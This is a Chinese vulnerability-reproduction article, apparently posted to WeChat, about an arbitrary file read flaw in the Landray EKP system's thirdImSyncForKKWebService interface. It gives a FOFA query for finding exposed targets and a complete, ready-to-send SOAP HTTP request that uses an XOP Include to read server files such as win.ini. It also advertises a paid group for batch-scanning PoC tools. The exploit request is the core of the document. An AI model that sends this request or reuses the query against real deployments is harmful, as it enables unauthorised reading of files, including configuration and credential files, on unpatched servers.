#  蓝凌EKP系统thirdImSyncForKKWebService接口存在任意文件读取漏洞 附POC   
2024-12-26更新  南风漏洞复现文库   2024-12-26 13:53  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 蓝凌EKP系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
蓝凌EKP系统  
## 2.漏洞描述  
  
蓝凌是国内知名的大平台OA服务商和国内领先的知识管理解决方案提供商，是专业从事组织的知识化咨询、软件研发、实施、技术服务的国家级高新技术企业。蓝凌EKP系统thirdImSyncForKKWebService接口存在任意文件读取漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
蓝凌EKP系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3byXq7aIX5UcaTe4hwpp1CaLjY638AuESWsWI53gsI1crUQFUqXIr6Eibv3OBCxxSOibcc9g5CtibgGA/640?wx_fmt=png&from=appmsg "null")  
  
蓝凌EKP系统thirdImSyncForKKWebService接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="Com_Parameter"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/sys/webservice/thirdImSyncForKKWebService  
  
漏洞数据包：  
```
POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
User-Agent:Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Host: xx.xx.xx.xxx
SOAPAction: ""
Content-Type: multipart/related; boundary=----oxmmdmlnvlx08yluof5q
Content-Length: 544

------oxmmdmlnvlx08yluof5q
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
<web:getTodo>
<arg0>
<otherCond>1</otherCond>
<pageNo>1</pageNo>
<rowSize>1</rowSize>
<targets>1</targets>
<type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///c:windows/win.ini"/></type>
</arg0>
</web:getTodo>
</soapenv:Body>
</soapenv:Envelope>
------oxmmdmlnvlx08yluof5q--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byXq7aIX5UcaTe4hwpp1Caqs53iaT5ghCz9Oct1bsyVR9QOtsZVyMrW5GEGP9wBpocuIj4Z8g6Ppg/640?wx_fmt=jpeg&from=appmsg "null")  
  
返回的文件需要base64解码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3byXq7aIX5UcaTe4hwpp1Ca7rkJPPKKuMMq3uAD0H21lO4h6ibtnOl5YATWxPcrIU0jQ426I2Ae7icQ/640?wx_fmt=png&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byXq7aIX5UcaTe4hwpp1CansGVAPK8icJepf3WL8oykuoBEfou2sGImo9ia67dUMuTJxUicfrT9a3pw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byXq7aIX5UcaTe4hwpp1CaCnUGR6y8F08pfkXvibEXAvbx1XR5CibVyjqj6xX515LSYNaFtu99FQgw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byXq7aIX5UcaTe4hwpp1CamdDZH7icRw6FYGIbGqv8LBg20FPZ9icLv5LV4jwSsNeogVcHjzMbKweA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byXq7aIX5UcaTe4hwpp1CapE0DOYffmtZUoHlDPte03nSBjeZkZrCbta8sYYmHxRpBZX3P90ee6w/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byXq7aIX5UcaTe4hwpp1CaOHqwqChCwRlLAib7cib933SjqGa0HVOHtgwLcfSPHEyVReDDPdKyXgbQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新：http://www.landray.com.cn  
## 8.往期回顾  
  
  
[大华DSS 系统attachment_downloadAtt.action存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487986&idx=1&sn=a88b5191db732c85f0b1e8f66e36f6da&scene=21#wechat_redirect)  
  
  
[YourPHPCMS checkEmail接口存在SQL注入漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487973&idx=1&sn=ae1887a94edc58e3f4368af534ceafa6&scene=21#wechat_redirect)  
  
  
